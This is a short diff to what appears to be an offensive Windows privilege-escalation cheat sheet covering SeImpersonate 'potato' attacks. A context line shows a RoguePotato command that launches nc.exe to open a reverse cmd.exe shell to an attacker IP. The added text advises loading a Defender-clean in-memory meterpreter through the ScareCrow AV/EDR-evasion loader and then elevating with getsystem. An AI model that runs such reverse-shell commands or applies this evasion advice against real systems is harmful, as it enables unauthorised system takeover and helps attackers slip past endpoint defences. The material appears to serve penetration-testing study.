@@ -63,6 +63,11 @@ Requires `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. Found on s
 .\RoguePotato.exe -r 10.10.14.X -e "cmd.exe /c C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe" -l 9999
 ```
 
+**Defender/EDR signaturing every potato binary?** Get a Defender-clean in-memory meterpreter first with
+[[scarecrow]] (AV/EDR-evasion payload loader), then elevate via meterpreter `getsystem` (named-pipe
+impersonation, the same `SeImpersonate` primitive, in-memory, dropping nothing new). Solve Defender once
+at the loader instead of once per potato artifact.
+
 ---
 
 ## SeBackupPrivilege — Read Any File
